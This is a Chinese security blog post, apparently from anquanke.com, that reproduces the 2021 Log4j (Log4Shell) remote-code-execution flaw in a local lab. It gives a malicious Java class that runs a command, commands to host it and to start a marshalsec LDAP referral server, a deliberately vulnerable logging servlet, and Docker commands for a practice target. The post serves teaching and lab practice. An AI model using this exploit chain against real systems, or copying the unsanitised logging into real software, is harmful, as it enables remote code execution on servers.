# Log4J 漏洞复现+漏洞靶场

阅读量 **367456**

发布时间 : 2021-12-15 17:30:47

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 前言

前几天晚上朋友圈算是过了年了，一个log4j大伙都忙了起来，看着朋友圈好久没这么热闹了。Apache
的这个log4j这个影响范围的确是大，包括我自己做开发的时候也会用到log4j，这就很尴尬了。

大家也不要在公网上疯狂测试了，我给大家带来了漏洞靶场，攻击视频在下文，一步一步教你。

漏洞原理我改天会详细的写一篇文章出来，今天就主要是复现一下漏洞。

昨晚爆出的log4j rce
是通过lookup触发的漏洞，但jdk1.8.191以上默认不支持ldap协议，对于高版本jdk,则需要一定的依赖。不过为了给大家最简单的说明，我这里还是用jdk1.8.144的版本来运行。

这个漏洞和fastjson的漏洞利用如出一辙，首先需要编写一个恶意类。

    
    
    public class Exploit {
        public Exploit(){
            try{
                // 要执行的命令
                String[] commands = {"open", "/System/Applications/Calculator.app"};
                Process pc = Runtime.getRuntime().exec(commands);
                pc.waitFor();
            } catch(Exception e){
                e.printStackTrace();
            }
        }
    
        public static void main(String[] argv) {
            Exploit e = new Exploit();
        }
    }
    

这里是弹出计算器

把这个类编译之后会得到一个Exploit.class，然后需要在当前目录下启动一个web服务，

    
    
    python3 -m http.server 8100
    

![](https://p5.ssl.qhimg.com/t01e10be80ab90575c5.png)

然后用 **[marshalsec](https://github.com/mbechler/marshalsec)**
IDAP服务，项目地址：<https://github.com/mbechler/marshalsec>

    
    
    java -cp /Users/fengxuan/Downloads/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8100/#Exploit"
    

![](https://p5.ssl.qhimg.com/t01941d1fef881bab18.png)

漏洞类

    
    
    package com.evalshell.webstudy;
    
    import org.apache.logging.log4j.LogManager;
    import org.apache.logging.log4j.Logger;
    
    import java.io.*;
    import javax.servlet.ServletException;
    import javax.servlet.http.*;
    import javax.servlet.annotation.*;
    
    
    @WebServlet(name = "helloServlet", value = "/hello-fengxuan")
    public class HelloServlet extends HttpServlet {
        private String message;
        private static final Logger logger = LogManager.getLogger(HelloServlet.class);
    
        public void init() {
            message = "Hello World!";
        }
    
        public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
            response.setContentType("text/html");
            response.setHeader("Content-Type", "text/html; charset=utf-8");
            System.out.println(request.getQueryString());
    
    
            // Hello
            PrintWriter out = response.getWriter();
            out.println("<html><body>");
            out.println("<span>你好，兄弟，请用post请求来搞我！</span>");
            out.println("</body></html>");
        }
    
    
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String name = req.getParameter("c");
            System.out.println(name);
            logger.error(name);
            resp.setContentType("text/html");
            resp.setHeader("Content-Type", "text/html; charset=utf-8");
            PrintWriter out = resp.getWriter();
            out.println("<html><body>");
            out.println("<h1>可恶！又被你装到了！</h1>");
            out.println("</body></html>");
        }
    
        public void destroy() {
        }
    }
    

## 最后运行

![](https://p4.ssl.qhimg.com/t019ffa5537afeaf936.png)

视频演示  
[https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&mid=2247513120&idx=1&sn=b3868562803c5200a0daf59c162d3ba3&chksm=ec2695b8db511cae5394407dbf51fb1f4452ba806c0ea4e921031d2934f2710944f3e951fc6f&token=1121957306&lang=zh_CN#rd](https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&mid=2247513120&idx=1&sn=b3868562803c5200a0daf59c162d3ba3&chksm=ec2695b8db511cae5394407dbf51fb1f4452ba806c0ea4e921031d2934f2710944f3e951fc6f&token=1121957306&lang=zh_CN#rd)

## 漏洞靶场

为了互联网的安全，也为了给大家学习的环境，有很多同学不知道如何复现，我搭建了一个漏洞靶场，我编写的docker-compose.yml

地址是：<https://github.com/fengxuangit/log4j_vuln>

或者直接运行命令

    
    
    docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln
    docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln 
    docker exec -it log4j_vuln_container /bin/bash
    /bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh
    

然后访问你的8080的端口, 访问 <http://127.0.0.1:8080/webstudy/> 就可以了

按照视频教程玩就行。你的靶场你自己随便玩！

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **雷石安全实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/263132](/post/id/263132)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞复现](/tag/漏洞复现)

 **+1** __2赞

 __收藏

![](https://p2.ssl.qhimg.com/t01ebe472d127128939.png) 雷石安全实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

